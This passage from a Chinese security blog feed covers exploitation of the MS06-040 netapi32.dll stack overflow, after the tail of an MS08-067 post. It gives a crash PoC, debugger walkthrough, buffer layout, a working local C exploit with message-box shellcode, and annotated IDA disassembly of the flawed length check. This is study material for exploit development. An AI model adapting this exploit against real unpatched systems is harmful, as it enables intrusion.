class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)JMP_ESP);</span><br><span class="line">    wcscat(path, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)SHELL_CODE);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220720105512544-16583052120081.png" alt="image-20220720105512544" style="zoom:67%;">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;ms08-067-简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ms08-067-简介&quot;&gt;&lt;/a&gt; MS08-067 简介&lt;/h1&gt;
&lt;p&gt;MS08-067 漏洞是由于 netapi32.dll 的导出函</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>RPC入侵：MS06-040</title>
    <link href="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/"/>
    <id>https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/</id>
    <published>2022-07-20T08:14:55.000Z</published>
    <updated>2022-08-01T11:19:57.752Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="rpc-漏洞"><a class="markdownIt-Anchor" href="#rpc-漏洞"></a> RPC 漏洞</h1><h2 id="rpc-漏洞简介"><a class="markdownIt-Anchor" href="#rpc-漏洞简介"></a> RPC 漏洞简介</h2><p>RPC 即 Remote Procedure Call，它是一种计算机进程间的通信方式。简单地说，RPC 就是让您在自己地程序中调用一个函数（可能需要很大地计算量），而这个函数在另外一个或多个远程机器上执行，执行完后将结果传回您的机器进行后续操作。</p><p>RPC漏洞，远程调用函数出现了问题，甚至有可被利用的安全漏洞。</p><h2 id="rpc编程简介"><a class="markdownIt-Anchor" href="#rpc编程简介"></a> RPC编程简介</h2><p>在 VC 中进行 RPC 调用的流程如下图所示。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220713220518781.png" alt="image-20220713220518781"><p>使用 RPC 调用时首先应当定义远程进程的接口 IDL 文件。 IDL（ Interface Description Language）是专门用来定义接口的语言，在这个文件里我们要指定 RPC 的接口信息以及 interface 下的 function 信息，包括函数的声明，参数等。</p><p>微软的 IDL 叫做 MIDL， 是兼容 IDL 标准的。定义好的 IDL 文件接口经过微软的 MIDL 编译器编译后会生成 3 个文件，一个客户端 stub（有些文献把 stub 翻译成“插桩”或“码桩”），一个服务端 stub，还有一个 RPC 调用的头文件。其中 stub 负责 RPC 调用过程中所有的网络操作细节。</p><p>在本章中将会用到 MS06-040 所需的接口文件，您可在看雪相关板块中下载附件。用 MIDL 编译接口文件rpc_exploit_040.acf 和 rpc_exploit_040.idl，得到 stub 文件和头文件。MIDL 编译器在 VC6.0 的组件里，可以在命令行下使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">midl /acf rpc_exploit_040.acf rpc_exploit_040.idl</span><br></pre></td></tr></table></figure><p>编译成功后，会在当前路径生成 3 个文件：<br>（ 1） rpc_exploit_040_s.c RPC 服务端 stub（桩）<br>（ 2） rpc_exploit_040_c.c R PC 客户端 stub（桩）<br>（ 3） rpc_exploit_040.h RPC 头文件</p><p>把两个 stub 添加进工程， include 头文件，和调用远程函数的程序一起 link，您就可以试着<br>去调用远程主机上的函数了。</p><h1 id="ms06-040"><a class="markdownIt-Anchor" href="#ms06-040"></a> MS06-040</h1><h2 id="ms06-040-简介"><a class="markdownIt-Anchor" href="#ms06-040-简介"></a> MS06-040 简介</h2><p>MS06-040 是这个漏洞的微软编号，其 CVE 编号为 CVE-2006-3439，对应补丁号为KB921883。</p><p>几乎所有使用 socket 网络的程序都会加载负责网络操作的 netapi32.dll。 MS06-040 指的就是这个动态链接库中的导出函数 NetpwPathCanonicalize() 中存在的缓冲溢出缺陷，而NetpwPathCanonicalize() 函数又可以被 RPC 远程调用，所以才会有这么大的危害。</p><h3 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h3><p>NetpwPathCanonicalize()是 netapi32.dll 的一个导出函数，用于格式化网络路径字符串，它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">NetpwPathCanonicalize</span> <span class="params">(</span></span><br><span class="line"><span class="params">uint16      path[ ],            <span class="comment">//[in]      path name</span></span></span><br><span class="line"><span class="params">uint8       can_path[ ],        <span class="comment">//[out]     canonicalizedpath</span></span></span><br><span class="line"><span class="params">uint32      maxbuf,             <span class="comment">//[in]      max size of can_path</span></span></span><br><span class="line"><span class="params">uint16      prefix[ ],          <span class="comment">//[in]      path prefix</span></span></span><br><span class="line"><span class="params">uint32*     pathtype,           <span class="comment">//[in out]  path type</span></span></span><br><span class="line"><span class="params">uint32      pathflags           <span class="comment">//[in]      path flags, 0 or 1</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>这是一个 Unicode 字符串处理函数，大体功能是：如果 prefix 串非空，将 prefix 串与 path串用‘ \’相连，并复制到输出串 can_path 中，输出串的容量为 maxbuf 字节大小：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prefix ＋ ‘\’ ＋ path =&gt; can_path [max_buf]</span><br></pre></td></tr></table></figure><p>在路径合并过程中，函数会做各种检查，如 prefix 或 path 长度是否越界、是否符合路径规范，或 can_path 的容量是否够大等等，否则函数将退出，并返回相应的错误号，例如，ERROR_INVALID_NAME （ 0x7B ）， ERROR_INVALID_PARAMETER （ 0x135 ），NERR_BufTooSmall（ 0x84B）等；函数成功则返回 0，并对 pathtype 进行更新。</p><p>首先在本地直接装载有漏洞的动态链接库，并调用这个函数，等到弄清楚栈中的细节之后，再实践远程利用。</p><p>触发这个漏洞的 POC 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">    <span class="type">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">    <span class="type">int</span> maxbuf = <span class="number">0x440</span>;</span><br><span class="line">    <span class="type">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">long</span> pathtype = <span class="number">44</span>;</span><br><span class="line"> </span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[] = <span class="string">&quot;./netapi32.dll&quot;</span>;</span><br><span class="line">    <span class="type">char</span> VulFunc[] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span>(path));</span><br><span class="line">    <span class="built_in">memset</span>(path, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(path) - <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memset</span>(prefix, <span class="number">0</span>, <span class="keyword">sizeof</span>(prefix));</span><br><span class="line">    <span class="built_in">memset</span>(prefix, <span class="string">&#x27;b&#x27;</span>, <span class="keyword">sizeof</span>(prefix) - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    (Trigger)(path, can_path, maxbuf, prefix, &amp;pathtype, <span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的功能是装载存在漏洞的 netapi32.dll，并调用其导出函数 NetpwPathCanonicalize。在函数调用时我们将 path 和 prefix 设置成很长的字符串，用以触发栈溢出。注意这个字符串以两个字节的 null 结束，这是因为 NetpwPathCanonicalize 将按照 Unicode 来处理字符串。</p><p>memset()函数，将缓冲区设置为指定字符。</p><table><thead><tr><th></th><th>推荐的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>winXP SP3</td><td>本地调试与操作系统版本无关</td></tr><tr><td>漏洞文件</td><td>netapi32.dll</td><td>在没有 patch 过 KB921883 的 Window 2000 操作系统中，该文件位于 c:\winnt\system32 下 ； 若操作系统已经被 patch ， 可 以在 c:\winnt$NtUninstallKB921883$下找到该文件；您也可以在本章的附带资料中找到这个动态链接库文件</td></tr><tr><td>编译器</td><td>VC++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>Release 版本</td><td>debug 版本在调试时可能会有细节上的差异</td></tr></tbody></table><blockquote><p>注意： 需要未打补丁的netapi32.dll，Windows 2000在C:\WINNT\system32目录下能找到，或者用以下提供的dll，但远程exploit必须要带有未打补丁dll的系统。本实验指导的调试基于使用的漏洞文件大小为 309008 字节，您可以在本章附带的电子资料中找到这个文件，请您在编译运行 POC 代码时将这个漏洞文件放在工程的相同路径下。</p></blockquote><blockquote><p>netapi32.dll 下载链接:<a href="https://pan.baidu.com/s/1qZQ1vnY">https://pan.baidu.com/s/1qZQ1vnY</a>  密码:5stq</p></blockquote><h4 id="定位程序崩溃点"><a class="markdownIt-Anchor" href="#定位程序崩溃点"></a> 定位程序崩溃点</h4><p>编译运行后，系统会提示出错，直接点调试。进入OD后，按 F9 运行到程序崩溃处，可以看到 EBP 和 EIP 都被覆盖为 “aaaa”。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714123823178-16577739716151.png" alt="image-20220714123823178"></p><p>重新加载程序，调试来到 call netapi32.NetpwPathCanonicalize 处。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714124834735.png" alt="image-20220714124834735"></p><p>进入 NetpwPathCanonicalize() 函数体后，按 “F8” 键继续单步跟踪。程序将在另一次函数调用时崩溃。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714132056431.png" alt="image-20220714132056431"></p><p>重新加载，“F7” 继续跟进，最后发现，在函数返回前 pop ebx 中，向栈中压入了大量 b 充当无效数据，导致在 retn 时，返回地址错误，发生崩溃。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714125708003.png" alt="image-20220714125708003"></p><h4 id="构造exploit"><a class="markdownIt-Anchor" href="#构造exploit"></a> 构造exploit</h4><p>反复跟踪后溢出函数后，发现这段程序首先将 prefix 所指的字符串“ bbbbbb……” 复制到栈中，然后在这个字符串后加上 Unicode 字符“\”（ 0x5C00），再将 path 中的长字符串“ aaaa……”连接在末尾，而正是连接 path 串的 wcscat 调用触发了漏洞。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714133733738.png" alt="image-20220714133733738"></p><p>程序“跑飞”之前的系统状态。<br>（ 1） prefix 串中包含了 0xFE 个字符‘b’（ 0x62），被复制到栈帧中开始于 0x0012F240 处的缓冲区。<br>（ 2）程序在 prefix 的末尾连接上 Unicode 字符‘ \’（ 0x005C）。<br>（ 3）程序在‘ \’后连接 0x31E 个字符‘ a’（ 0x61），这次字符串连接操作造成了栈帧溢出，位于 0x0012F654 处的 EBP 及紧随其后的返回地址都被改写。(图26.2.6地址与本次实验地址不同)</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717224801801.png" alt="image-20220717224801801"></p><p>ECX 在函数返回时总是指向栈中缓冲区，因此我们可以把 shellcode 放在 prefix 串中，并采用JMP ECX 作为定位 shellcode 的跳板。用 OllyDbg 在内存中搜索指令 JMP ECX。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714152047332.png" alt="image-20220714152047332"></p><p>用 netapi32.dll 自身代码空间中 0x751852F9 处的 CALL ECX 作为跳转指令。</p><p>布置缓冲区如下。<br>（ 1）缓冲区中的内容为： (prefi x:bbb …) +（ \） +（ path: aaa…）。<br>（ 2）目前 prefix 串大小为 0x100（ 256）字节，除去两个字节 null 作为结束符， 254 字节基本能够容纳 shellcode。<br>（ 3）缓冲区起址： 0x0012F240。<br>（ 4） EBP 位置： 0x0012F654。<br>（ 5）返回地址： 0x0012F240。<br>（ 6）返回地址距离缓冲区的偏移为： 0x0012F654-0x0012F240=0x418，去掉 prefix 和 ‘ \’ 的影响， path 串偏移 0x418-0x100=0x318 处的 DWORD 将淹没返回地址，在那里填入跳转地址即可执行 shellcode。</p><p>仍然使用弹出“ failwest”消息框的 shellcode 进行测试，最终的本地溢出利用代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">    <span class="type">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">    <span class="type">int</span> maxbuf=<span class="number">0x440</span>;</span><br><span class="line">    <span class="type">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">long</span> pathtype=<span class="number">44</span>;</span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    <span class="built_in">memset</span>(path,<span class="number">0</span>,<span class="keyword">sizeof</span>(path));</span><br><span class="line">    <span class="built_in">memset</span>(path,<span class="number">0x90</span>,<span class="keyword">sizeof</span>(path)<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">memset</span>(prefix,<span class="number">0</span>,<span class="keyword">sizeof</span>(prefix));</span><br><span class="line">    <span class="built_in">memset</span>(prefix,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(prefix)<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(prefix,shellcode,<span class="number">168</span>);</span><br><span class="line">    path[<span class="number">0x318</span>]=<span class="number">0xF9</span>;<span class="comment">// address of CALL ECX</span></span><br><span class="line">    path[<span class="number">0x319</span>]=<span class="number">0x52</span>;</span><br><span class="line">    path[<span class="number">0x31A</span>]=<span class="number">0x18</span>;</span><br><span class="line">    path[<span class="number">0x31B</span>]=<span class="number">0x75</span>;</span><br><span class="line">    (Trigger)(path,can_path,maxbuf,prefix,&amp;pathtype,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行，就能看到 failwest 消息框了。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714153344604.png" alt="image-20220714153344604" style="zoom: 50%;"><p>总结一下动态调试的思路。<br>（ 1）第一次调试看到 EIP 已经被改写为 0x61616161，证明传入的参数可以制造溢出并控制EIP，但堆栈被破坏，无法看到溢出前的函数调用。<br>（ 2）跟踪调试，找到 NetpwPathCanonicalize 的 VA 地址，直接对这个 VA 地址下断点。<br>（ 3）单步跟踪 NetpwPathCanonicalize 函数，观察寄存器的变化，发现是其中的一次函数调用引起的错误。<br>（ 4）第三次调试直接针对 NetpwPathCanonicalize 中引起错误的子函数，单步跟踪一轮后，彻底弄清楚栈中布局，编写本地 exploit。</p><h2 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h2><p>通过 IDA 加载 netapi32.dll，找到漏洞的缺陷代码，NetpwPathCanonicalize 函数中的 CanoicalizePathName 函数，如下图黄色框内。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714223348998.png" alt="image-20220714223348998"><p>在动态调试时，我们已经知道产生溢出的函数实际上是 0x7517F856 处调用的的子函数 CanonicalizePathName()， prefix 串与 path 串的合并操作就位于其中，该函数的声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CanonicalizePathName</span> <span class="params">(</span></span><br><span class="line"><span class="params">    uint16 prefix[ ], <span class="comment">// [in] path prefix</span></span></span><br><span class="line"><span class="params">    uint16path[ ], <span class="comment">// [in] path name</span></span></span><br><span class="line"><span class="params">    uint8 can_path[ ], <span class="comment">// [out] canonicalized path</span></span></span><br><span class="line"><span class="params">    uint32 maxbuf, <span class="comment">// [in] max byte size of can_path</span></span></span><br><span class="line"><span class="params">    uint32 can_size <span class="comment">// [in out] byte size of can_path</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>用 IDA 重点看一下这个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">; =============== S U B R O U T I N E ===============================</span><br><span class="line">; int   stdcall CanonicalizePathName(wchar_t *, wchar_t *, wchar_t*, int, int)</span><br><span class="line">7517FC68 CanonicalizePathName proc near</span><br><span class="line">7517FC68</span><br><span class="line">7517FC68 Buff_last_word  = word ptr -416h</span><br><span class="line">7517FC68 Buff_OF         = word ptr -414h</span><br><span class="line">7517FC68 arg_Prefix      = dword ptr  8</span><br><span class="line">7517FC68 arg_Path        = dword ptr  0Ch</span><br><span class="line">7517FC68 arg_CanPath     = dword ptr  10h</span><br><span class="line">7517FC68 arg_Maxbuf      = dword ptr  14h</span><br><span class="line">7517FC68 arg_CanSize     = dword ptr  18h</span><br><span class="line">7517FC68</span><br><span class="line">7517FC68 push   ebp</span><br><span class="line">7517FC69 mov    ebp, esp</span><br><span class="line">7517FC6B sub esp, 414h ; 分配 0x414 字节栈空间，即 Buff_OF，用来</span><br><span class="line">; 存储合并路径(prefix+’\’+path)</span><br><span class="line">7517FC71 push ebx</span><br><span class="line">7517FC72 push esi</span><br><span class="line">7517FC73 xor esi, esi</span><br><span class="line">7517FC75 push edi</span><br><span class="line">7517FC76 cmp [ebp+arg_Prefix], esi</span><br><span class="line">7517FC79 mov edi, ds:__imp_wcslen</span><br><span class="line">7517FC7F mov ebx, 411h ; ebx 始终等于 0x411，用于检查越界（字节）</span><br><span class="line">; 长度</span><br><span class="line">7517FC84 jz short @@prefix_ptr_zero</span><br><span class="line">7517FC86 push [ebp+arg_Prefix]</span><br><span class="line">7517FC89 call edi ; __imp_wcslen</span><br><span class="line">                        ; 计算 prefix 串的 Unicode 长度，注意为字</span><br><span class="line">                        ; 节长度的一半，这是导致边界检查被突破的根</span><br><span class="line">                        ; 本原因，即用 Unicode 检查边界，而栈空间</span><br><span class="line">                        ; 是按字节开的</span><br><span class="line">7517FC8B mov esi, eax ; esi 始终记录 prefix 串的 Unicode 长度</span><br><span class="line">7517FC8D pop ecx</span><br><span class="line">7517FC8E test esi, esi</span><br><span class="line">7517FC90 jz short @@chk_pathname</span><br><span class="line">7517FC92 cmp esi, ebx ; prefix 是否大于 0x411</span><br><span class="line">7517FC94 ja @@err_invalid_name</span><br><span class="line">; 若越界，则退出程序</span><br><span class="line">7517FC9A push [ebp+arg_Prefix]</span><br><span class="line">7517FC9D lea eax, [ebp+Buff_OF]</span><br><span class="line">7517FCA3 push eax</span><br><span class="line">7517FCA4 call ds:__imp_wcscpy</span><br><span class="line">                        ; 将 prefix 串写入栈空间 Buff_OF 暂存。虽然前</span><br><span class="line">                        ; 面的边界检查有缺陷，似乎实际可以传入的 prefix</span><br><span class="line">                        ; 串可以达到 0x822 字节，但是在传入本函数前,</span><br><span class="line">                        ; prefix 串已被 NetpwPathType()检查过，其长度</span><br><span class="line">                        ; 不能超过 0x206 字节，所以光靠这里的检查缺陷</span><br><span class="line">                        ; 还不足以通过 prefix 串制造溢出</span><br><span class="line">…</span><br><span class="line">7517FCED @@prefix_ptr_zero:</span><br><span class="line">7517FCED mov [ebp+Buff_OF], si</span><br><span class="line">7517FCF4 @@chk_pathname:</span><br><span class="line">7517FCF4 push [ebp+arg_Path]</span><br><span class="line">7517FCF7 call edi ; __imp_wcslen</span><br><span class="line">; 计算 path 串的 Unicode 长度</span><br><span class="line">7517FCF9 add eax, esi ; 合并前，计算合并路径(prefix+’\’+path)的</span><br><span class="line">; Unicode 长度</span><br><span class="line">7517FCFB pop ecx</span><br><span class="line">7517FCFC cmp eax, ebx ; 第二次边界检查，仍然将 Unicode 字符长度与</span><br><span class="line">; 字节长度 0x411 进行比较</span><br><span class="line">7517FCFE ja short @@err_invalid_name</span><br><span class="line">                        ; 从前面的分析可以知道，只靠 prefix 串是无法</span><br><span class="line">                        ; 制造溢出的，但是 path 串的传入没有任何限制，</span><br><span class="line">                        ; 所以可以通过增加 path 串的长度溢出。栈空间</span><br><span class="line">                        ; 为 0x414，我们实际可以传入的串总长可以达到</span><br><span class="line">                        ; 或或超过 0x828</span><br><span class="line">7517FD00 push [ebp+arg_Path]</span><br><span class="line">7517FD03 lea eax, [ebp+Buff_OF]</span><br><span class="line">7517FD09 push eax</span><br><span class="line">7517FD0A call ds:__imp_wcscat ; 将 path 串继续连入 Buff_OF，生成最终</span><br><span class="line">                                ; 的合并路径，这个调用导致了最终的栈溢出</span><br><span class="line">…</span><br><span class="line">7517FD3E @@err_invalid_name:</span><br><span class="line">7517FD3E push ERROR_INVALID_NAME</span><br><span class="line">7517FD40 pop eax</span><br><span class="line">7517FD41 jmp short @@quit</span><br><span class="line">…</span><br><span class="line">7517FD7A @@quit:</span><br><span class="line">7517FD7A pop edi</span><br><span class="line">7517FD7B pop esi</span><br><span class="line">7517FD7C pop ebx</span><br><span class="line">7517FD7D leave</span><br><span class="line">7517FD7E retn 14h</span><br><span class="line">7517FD7E CanonicalizePathName endp</span><br><span class="line">; =============== S U B R O U T I N E ===============================</span><br><span 